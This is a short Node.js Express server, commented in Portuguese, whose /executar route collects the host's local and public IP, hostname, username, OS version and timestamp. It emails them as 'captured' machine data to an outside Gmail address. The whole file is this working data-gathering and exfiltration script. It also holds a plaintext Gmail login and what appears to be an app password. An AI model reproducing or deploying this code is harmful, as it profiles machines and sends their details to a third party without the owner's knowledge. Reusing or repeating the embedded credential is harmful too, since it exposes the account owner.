const express = require('express');
const os = require('os');
const axios = require('axios');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/executar', async (req, res) => {
  try {
    // IP local
    const interfaces = os.networkInterfaces();
    let ipLocal = 'Não encontrado';
    for (const iface of Object.values(interfaces)) {
      for (const config of iface) {
        if (config.family === 'IPv4' && !config.internal) {
          ipLocal = config.address;
        }
      }
    }

    // IP público
    const response = await axios.get('http://ipinfo.io/ip');
    const ipPublico = response.data.trim();

    // Nome da máquina e usuário
    const nomeMaquina = os.hostname();
    const nomeUsuario = os.userInfo().username;

    // Sistema operacional
    const sistemaOperacional = `${os.type()} ${os.release()}`;

    // Data e hora
    const dataHora = new Date().toLocaleString();

    // Conteúdo do email
    const dados = `
    IP Local: ${ipLocal}
    IP Público: ${ipPublico}
    Nome da Máquina: ${nomeMaquina}
    Nome do Usuário: ${nomeUsuario}
    Sistema Operacional: ${sistemaOperacional}
    Data e Hora: ${dataHora}
    `.trim();

    // Configuração do transporte
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'derickcampossantos1@gmail.com',
        pass: 'cisi zrmz lnyg qtta',
      },
    });

    const mailOptions = {
      from: 'derickcampossantos1@gmail.com',
      to: 'derickcampossantos1@gmail.com',
      subject: 'Dados da Máquina Capturados (via Node)',
      text: dados,
    };

    await transporter.sendMail(mailOptions);
    console.log('Email enviado com sucesso.');

    res.send('<h2>Email enviado com os dados capturados!</h2>');
  } catch (err) {
    console.error('Erro:', err);
    res.status(500).send('Erro ao capturar os dados ou enviar o e-mail.');
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});
